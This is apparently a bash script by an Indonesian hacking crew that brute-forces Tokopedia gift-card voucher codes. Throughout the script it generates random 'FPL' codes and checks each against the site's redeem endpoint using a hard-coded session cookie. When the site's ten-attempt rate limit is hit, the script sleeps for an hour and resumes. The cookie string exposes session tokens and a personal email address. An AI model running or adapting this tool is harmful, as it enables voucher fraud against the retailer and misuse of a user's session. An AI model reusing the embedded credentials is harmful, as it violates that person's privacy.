#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
clear
header
echo "1 Akun Max 10 kali generate"
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUzOTY3Mjg3OHxJbWxUVEVwUFJrMW9XV2NyTm1KbldrZElUamhJTDJvemJ6WlJjMEZvWmpSU2J6ZE1VM3BMWTFKUFlWazlJZ289fK7PpGO1znBVk6BVTotWYaXFLxr6j8GmDO3O5a74UuzL; _SID_Tokopedia_=UM0ZvOdZWO_7QvgKhFu9hZQAbfaNOzpWqduVlG1u_LzQqmsj_wtH4NZGdX-VTLBcGQEG5H5dGnQ5-Kves5xba2K6CwtDh6AlryFUFfIqJdk3TLFlnn2IqvVId1YtwDMW; state=eyJyZWYiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tLyIsInV1aWQiOiIwYWZkMDNkMS01NTAwLTRjYjUtOGVkYy0xM2RiZTdlZDM5MGEiLCJ0aGVtZSI6ImlmcmFtZSIsInAiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tLyJ9; lang=id; _ID_autocomplete_=ef0aa053c2304916a3f94daa07ac23fd; _gcl_au=1.1.1692107313.1539672681; __asc=4045dbe71667ba4aaafaf5f172d; __auc=4045dbe71667ba4aaafaf5f172d; _BID_TOKOPEDIA_=3889cedbad927633dbc59f3c3e6ac5c5; insdrSV=5; scs=%7B%22t%22%3A1%7D; ins-gaSSId=f5e9bcd1-bbbc-b009-1b32-f7c10d0fb39b_1539676283; _ga=GA1.2.669863426.1539672686; _gid=GA1.2.200463248.1539672686; cto_lwid=388eea9e-d835-4c7f-b59d-6578332eb5c1; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%22ebcfaa58-3051-4ee0-95a7-5d2abb705266%22%2C%22deviceAdded%22%3Afalse%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22prompt%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1539672882331; insUserData=%7B%22email%22%3A%22rizalo.iid%40gmail.com%22%7D; l=1; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiZWUwNjgzZWItZjk3OC00YWE4LWFkN2ItZjY4ODJlNGFmYzQ5IiwiaXNfYWpheCI6dHJ1ZX0; pulsa-aff=undefined; zarget_visitor_info=%7B%7D; _dc_gtm_UA-9801603-23=1; _ga=GA1.3.669863426.1539672686; _gid=GA1.3.200463248.1539672686; _gat_UA-9801603-23=1"
#ganti cok nya doang kontol
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	base="FPL$generate"
	ok=$(ngelog $base | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	echo "$base [ $ok ]"
	if [[ "$ok" =~ 'Anda telah mencoba lebih dari 10x' ]]; then
	secs=$((60 * 60))
		while [ $secs -gt 0 ]; do
   	echo -ne "Menunggu selama : $secs Untuk Auto Run :)\033[0K\r"
   	sleep 1
   	: $((secs--))
	done
	fi
done
